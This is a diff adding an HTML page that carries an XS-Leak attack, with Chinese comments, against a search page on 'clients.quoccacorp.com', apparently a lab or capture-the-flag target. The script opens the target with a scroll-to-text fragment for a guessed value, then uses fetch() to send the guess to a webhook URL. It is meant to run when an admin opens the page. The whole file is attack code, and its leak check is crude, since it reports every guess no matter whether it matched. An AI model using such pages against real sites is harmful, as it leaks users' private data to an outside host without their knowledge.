@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <script>
+        const WEBHOOK = "https://webhooksite.net/d0d97f98-91ad-4292-a927-e1382192f586";
+        const TARGET_BASE = "https://clients.quoccacorp.com/?q=";
+
+        // 假設我們要猜測第一個字，或是測試是否能成功洩漏
+        async function tryLeak(guess) {
+            // 利用 Scroll-to-text Fragment 觸發瀏覽器行為
+            const url = `${TARGET_BASE}${guess}#:~:text=${guess}`;
+            
+            // 開啟目標網頁
+            const win = window.open(url);
+
+            // 這裡是一個常用的 XS-Leak 技巧：
+            // 如果搜尋成功，頁面會滾動，這會導致某些瀏覽器事件或時間延遲
+            // 為了簡單測試，我們直接讓 Admin 訪問後回傳一個訊息給你
+            setTimeout(() => {
+                fetch(`${WEBHOOK}?found=${guess}`);
+                if (win) win.close();
+            }, 1000);
+        }
+
+        // 觸發攻擊
+        tryLeak("1776"); 
+    </script>
+</body>
+</html>
